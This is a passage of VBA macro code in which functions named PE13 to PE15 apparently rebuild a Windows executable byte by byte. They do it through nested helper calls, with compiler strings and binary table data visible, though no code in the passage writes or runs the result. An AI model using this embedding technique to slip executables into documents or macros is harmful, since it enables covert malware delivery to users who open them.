    strPE = B(A(A(A(A(B(strPE, " 10-win32 20210110"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525")
    strPE = B(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-")
    strPE = A(A(A(A(B(A(A(A(A(B(strPE, "win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0)
    strPE = B(A(A(A(A(B(strPE, "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win3")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "2 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC:")
    strPE = B(A(A(A(A(B(strPE, " (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GN")
    strPE = B(A(A(A(A(B(strPE, "U) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 202005")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "25"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 1")
    strPE = A(A(B(A(A(A(A(B(strPE, "0-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0)
    strPE = B(A(A(A(A(B(A(A(strPE, 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-wi")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "n32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GC")
    strPE = B(A(A(A(A(B(strPE, "C: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 ")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20210110"), 0), 0), 0), 0), "GCC: (")
    strPE = B(A(A(A(A(B(strPE, "GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 2020")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "0525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU)")
    strPE = B(A(A(A(A(B(strPE, " 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525")

    PE13 = strPE
End Function

Private Function PE14() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-")
    strPE = A(A(A(A(B(A(A(A(A(B(strPE, "win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0)
    strPE = B(A(A(A(A(B(strPE, "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win3")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "2 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC:")
    strPE = B(A(A(A(A(B(strPE, " (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GN")
    strPE = B(A(A(A(A(B(strPE, "U) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 202005")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "25"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20200525"), 0), 0), 0), 0), "GCC: (GNU) 1")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "0-win32 20210110"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 16), 0), 0), 1), 16), 0), 0), 0), 192), 0), 0), 16), 16), 0), 0), ">"), 17), 0), 0), 4), 192), 0), 0), "@"), 17), 0), 0), 137), 17), 0), 0), 12), 192)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 144), 17), 0), 0), 182), 20), 0), 0), 20), 192), 0), 0), 192), 20), 0), 0), 221), 20), 0), 0), "("), 192), 0), 0), 224), 20), 0), 0), 253), 20), 0), 0), "H"), 192), 0), 0), 0), 21), 0), 0), 25), 21), 0), 0), "h"), 192), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, " "), 21), 0), 0), ","), 21), 0), 0), "p"), 192), 0), 0), "0"), 21), 0), 0), "1"), 21), 0), 0), "t"), 192), 0), 0), "@"), 21), 0), 0), 148), 21), 0), 0), "x"), 192), 0), 0), 148), 21), 0), 0), 207), 26), 0), 0), 132), 192), 0), 0), 208), 26)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 10), 27), 0), 0), 148), 192), 0), 0), 16), 27), 0), 0), "z"), 27), 0), 0), 156), 192), 0), 0), 128), 27), 0), 0), 159), 27), 0), 0), 168), 192), 0), 0), 160), 27), 0), 0), 167), 27), 0), 0), 172), 192), 0), 0), 176), 27), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 179), 27), 0), 0), 176), 192), 0), 0), 192), 27), 0), 0), 239), 27), 0), 0), 180), 192), 0), 0), 240), 27), 0), 0), "q"), 28), 0), 0), 188), 192), 0), 0), 128), 28), 0), 0), 131), 28), 0), 0), 200), 192), 0), 0), 144), 28), 0), 0), 136), 29)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 204), 192), 0), 0), 144), 29), 0), 0), 147), 29), 0), 0), 228), 192), 0), 0), 160), 29), 0), 0), 10), 30), 0), 0), 232), 192), 0), 0), 16), 30), 0), 0), "r"), 31), 0), 0), 244), 192), 0), 0), 128), 31), 0), 0), 14), 34), 0), 0)
    strPE = A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 0), 193), 0), 0), 16), 34), 0), 0), "Q"), 34), 0), 0), 24), 193), 0), 0), "`"), 34), 0), 0), "l"), 34), 0), 0), " "), 193), 0), 0), "p"), 34), 0), 0), "*$"), 0), 0), "$"), 193), 0), 0), "0$"), 0), 0), 155), "$"), 0), 0), ","), 193)
    strPE = A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 160), "$"), 0), 0), 24), "%"), 0), 0), "<"), 193), 0), 0), " %"), 0), 0), 169), "%"), 0), 0), "H"), 193), 0), 0), 176), "%"), 0), 0), 146), "&"), 0), 0), "P"), 193), 0), 0), 160), "&"), 0), 0), 204), "&"), 0), 0), "X"), 193), 0), 0)
    strPE = B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(strPE, 208), "&"), 0), 0), 31), "'"), 0), 0), "\"), 193), 0), 0), " '"), 0), 0), 191), "'"), 0), 0), "`"), 193), 0), 0), 192), "'"), 0), 0), "8("), 0), 0), "l"), 193), 0), 0), "@("), 0), 0), "y("), 0), 0), "p"), 193), 0), 0), 128), "(")
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(strPE, 0), 0), 235), "("), 0), 0), "t"), 193), 0), 0), 240), "("), 0), 0), "&)"), 0), 0), "x"), 193), 0), 0), "0)"), 0), 0), 183), ")"), 0), 0), "|"), 193), 0), 0), 192), ")"), 0), 0), "~*"), 0), 0), 128), 193), 0), 0), 192), "*"), 0), 0)
    strPE = B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 7), "+"), 0), 0), 132), 193), 0), 0), 16), "+"), 0), 0), "#,"), 0), 0), 144), 193), 0), 0), "0,"), 0), 0), 135), ","), 0), 0), 152), 193), 0), 0), 144), ","), 0), 0), 232), "-"), 0), 0), 160), 193), 0), 0), 240), "-"), 0), 0), " /")
    strPE = A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 180), 193), 0), 0), " /"), 0), 0), "g/"), 0), 0), 192), 193), 0), 0), "p/"), 0), 0), 29), "0"), 0), 0), 204), 193), 0), 0), " 0"), 0), 0), "?5"), 0), 0), 212), 193), 0), 0), "@5"), 0), 0), 236), "8"), 0), 0)
    strPE = A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 236), 193), 0), 0), 240), "8"), 0), 0), "P:"), 0), 0), 4), 194), 0), 0), "P:"), 0), 0), 1), ">"), 0), 0), 24), 194), 0), 0), 16), ">"), 0), 0), 240), ">"), 0), 0), "("), 194), 0), 0), 240), ">"), 0), 0), 160), "?"), 0), 0), "4"), 194)
    strPE = A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 160), "?"), 0), 0), 136), "@"), 0), 0), "@"), 194), 0), 0), 144), "@"), 0), 0), 0), "B"), 0), 0), "L"), 194), 0), 0), 0), "B"), 0), 0), "KG"), 0), 0), "X"), 194), 0), 0), "PG"), 0), 0), 247), "P"), 0), 0), "l"), 194), 0), 0)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(strPE, 0), "Q"), 0), 0), "7Q"), 0), 0), 132), 194), 0), 0), "@Q"), 0), 0), 188), "Q"), 0), 0), 140), 194), 0), 0), 192), "Q"), 0), 0), 220), "Q"), 0), 0), 152), 194), 0), 0), 224), "Q"), 0), 0), "VS"), 0), 0), 156), 194), 0), 0), "`S")
    strPE = A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 0), 0), " j"), 0), 0), 180), 194), 0), 0), " j"), 0), 0), 21), "k"), 0), 0), 208), 194), 0), 0), " k"), 0), 0), "ck"), 0), 0), 224), 194), 0), 0), "pk"), 0), 0), "Ll"), 0), 0), 228), 194), 0), 0), "Pl"), 0), 0)
    strPE = B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 146), "l"), 0), 0), 240), 194), 0), 0), 160), "l"), 0), 0), 146), "m"), 0), 0), 248), 194), 0), 0), 160), "m"), 0), 0), 4), "n"), 0), 0), 4), 195), 0), 0), 16), "n"), 0), 0), 189), "n"), 0), 0), 12), 195), 0), 0), 192), "n"), 0), 0), "}o")
    strPE = A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 0), 0), 28), 195), 0), 0), 128), "o"), 0), 0), 217), "p"), 0), 0), "$"), 195), 0), 0), 224), "p"), 0), 0), 224), "r"), 0), 0), "<"), 195), 0), 0), 224), "r"), 0), 0), 238), "s"), 0), 0), "P"), 195), 0), 0), 240), "s"), 0), 0), "@t"), 0), 0)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(strPE, "d"), 195), 0), 0), "@t"), 0), 0), 5), "v"), 0), 0), "h"), 195), 0), 0), 16), "v"), 0), 0), "(w"), 0), 0), "x"), 195), 0), 0), "0w"), 0), 0), "9x"), 0), 0), 128), 195), 0), 0), "@x"), 0), 0), "jx"), 0), 0), 140), 195)
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 0), 0), "px"), 0), 0), 152), "x"), 0), 0), 144), 195), 0), 0), 160), "x"), 0), 0), 199), "x"), 0), 0), 148), 195), 0), 0), 176), "y"), 0), 0), "-{"), 0), 0), 152), 195), 0), 0), "0{"), 0), 0), 152), "{"), 0), 0), 164), 195), 0), 0)
    strPE = B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(strPE, 160), "{"), 0), 0), 165), "|"), 0), 0), 180), 195), 0), 0), 176), "|"), 0), 0), 10), "}"), 0), 0), 200), 195), 0), 0), 16), "}"), 0), 0), 153), "}"), 0), 0), 216), 195), 0), 0), 160), "}"), 0), 0), 225), "}"), 0), 0), 224), 195), 0), 0), 240), "}")
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 230), "~"), 0), 0), 236), 195), 0), 0), 240), "~"), 0), 0), 15), 127), 0), 0), 0), 196), 0), 0), 16), 127), 0), 0), 24), 127), 0), 0), 8), 196), 0), 0), " "), 127), 0), 0), "+"), 127), 0), 0), 12), 196), 0), 0), "0"), 127), 0), 0)
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 151), 127), 0), 0), 16), 196), 0), 0), 160), 127), 0), 0), 0), 128), 0), 0), 24), 196), 0), 0), 0), 128), 0), 0), 11), 128), 0), 0), " "), 196), 0), 0), 16), 128), 0), 0), 27), 128), 0), 0), "$"), 196), 0), 0), " "), 128), 0), 0), "+"), 128)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 0), 0), "("), 196), 0), 0), 16), 129), 0), 0), 21), 129), 0), 0), ","), 196), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 1), 0), 0), 0), 1), 4), 1), 0), 4), "B"), 0), 0), 1), 4), 1), 0), 4), "b"), 0), 0), 1), 15), 8), 0), 15), 1), 19), 0), 8), "0"), 7), "`"), 6), "p"), 5), "P"), 4), 192), 2), 208), 9), 4), 1), 0), 4), "B"), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 168), "y"), 0), 0), 1), 0), 0), 0), 196), 20), 0), 0), 215), 20), 0), 0), "p"), 34), 0), 0), 215), 20), 0), 0), 9), 4), 1), 0), 4), "B"), 0), 0), 168), "y"), 0), 0), 1), 0), 0), 0), 228), 20), 0), 0), 247), 20), 0), 0), "p"), 34)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 247), 20), 0), 0), 1), 4), 1), 0), 4), "B"), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 14), 4), 133), 14), 3), 6), "b"), 2), "0"), 1), "P"), 1), 18), 6), 133), 18), 3), 10), 1), 180), 0), 3), "`"), 2), "p"), 1), "P")
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 1), 4), 1), 0), 4), "B"), 0), 0), 1), 6), 3), 0), 6), "B"), 2), "0"), 1), "`"), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 4), 1), 0), 4), "B"), 0), 0), 1), 6), 3), 0), 6), "B"), 2), "0"), 1), "`")
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 1), 0), 0), 0), 1), 22), 9), 0), 22), 136), 6), 0), 16), "x"), 5), 0), 11), "h"), 4), 0), 6), 226), 2), "0"), 1), "`"), 0), 0), 1), 0), 0), 0), 1), 7), 3), 0), 7), "b"), 3), "0"), 2), 192), 0), 0), 1), 8), 4), 0)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(strPE, 8), 146), 4), "0"), 3), "`"), 2), 192), 1), 24), 10), 133), 24), 3), 16), "b"), 12), "0"), 11), "`"), 10), "p"), 9), 192), 7), 208), 5), 224), 3), 240), 1), "P"), 1), 4), 1), 0), 4), 162), 0), 0), 1), 0), 0), 0), 1), 6), 2), 0), 6), "2")
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(strPE, 2), 192), 1), 9), 5), 0), 9), "B"), 5), "0"), 4), "`"), 3), "p"), 2), 192), 0), 0), 1), 7), 4), 0), 7), "2"), 3), "0"), 2), "`"), 1), "p"), 1), 5), 2), 0), 5), "2"), 1), "0"), 1), 5), 2), 0), 5), "2"), 1), "0"), 1), 0), 0), 0)
    strPE = A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(strPE, 1), 0), 0), 0), 1), 8), 4), 0), 8), "2"), 4), "0"), 3), "`"), 2), 192), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 9), 4), 0), 9), "R"), 5), "0"), 4), 192)

    PE14 = strPE
End Function

Private Function PE15() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 2), 208), 1), 4), 1), 0), 4), 162), 0), 0), 1), 5), 2), 0), 5), "2"), 1), "0"), 1), 14), 8), 0), 14), "r"), 10), "0"), 9), "`"), 8), "p"), 7), "P"), 6), 192), 4), 208), 2), 224), 1), 7), 4), 0), 7), "2"), 3), "0"), 2), "`"), 1), "p")
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 1), 7), 3), 0), 7), "B"), 3), "0"), 2), 192), 0), 0), 1), 4), 1), 0), 4), "b"), 0), 0), 1), 24), 10), 133), 24), 3), 16), "b"), 12), "0"), 11), "`"), 10), "p"), 9), 192), 7), 208), 5), 224), 3), 240), 1), "P"), 1), 24), 10), 133), 24), 3)
    strPE = B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(strPE, 16), "B"), 12), "0"), 11), "`"), 10), "p"), 9), 192), 7), 208), 5), 224), 3), 240), 1), "P"), 1), 13), 7), 5), 13), "R"), 9), 3), 6), "0"), 5), "`"), 4), "p"), 3), 192), 1), "P"), 0), 0), 1), 8), 5), 0), 8), "B"), 4), "0"), 3), "`"), 2), "p")
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(strPE, 1), "P"), 0), 0), 1), 9), 4), 0), 9), "2"), 5), "0"), 4), 192), 2), 208), 1), 7), 3), 0), 7), 194), 3), "0"), 2), 192), 0), 0), 1), 7), 3), 0), 7), 194), 3), "0"), 2), 192), 0), 0), 1), 8), 4), 0), 8), 178), 4), "0"), 3), "`")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(strPE, 2), 192), 1), 12), 7), 0), 12), 162), 8), "0"), 7), "`"), 6), "p"), 5), "P"), 4), 192), 2), 208), 0), 0), 1), 19), 10), 0), 19), 1), 21), 0), 12), "0"), 11), "`"), 10), "p"), 9), "P"), 8), 192), 6), 208), 4), 224), 2), 240), 1), 5), 2), 0)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(strPE, 5), "2"), 1), "0"), 1), 7), 4), 0), 7), "2"), 3), "0"), 2), "`"), 1), "p"), 1), 0), 0), 0), 1), 16), 9), 0), 16), "b"), 12), "0"), 11), "`"), 10), "p"), 9), "P"), 8), 192), 6), 208), 4), 224), 2), 240), 0), 0), 1), 27), 12), 0), 27), "h")
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(strPE, 10), 0), 19), 1), 23), 0), 12), "0"), 11), "`"), 10), "p"), 9), "P"), 8), 192), 6), 208), 4), 224), 2), 240), 1), 6), 5), 0), 6), "0"), 5), "`"), 4), "p"), 3), "P"), 2), 192), 0), 0), 1), 0), 0), 0), 1), 6), 3), 0), 6), "B"), 2), "0")
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(strPE, 1), "`"), 0), 0), 1), 5), 2), 0), 5), "2"), 1), "0"), 1), 6), 3), 0), 6), "b"), 2), "0"), 1), "`"), 0), 0), 1), 6), 2), 0), 6), "2"), 2), 192), 1), 10), 5), 0), 10), "B"), 6), "0"), 5), "`"), 4), 192), 2), 208), 0), 0), 1), 5)
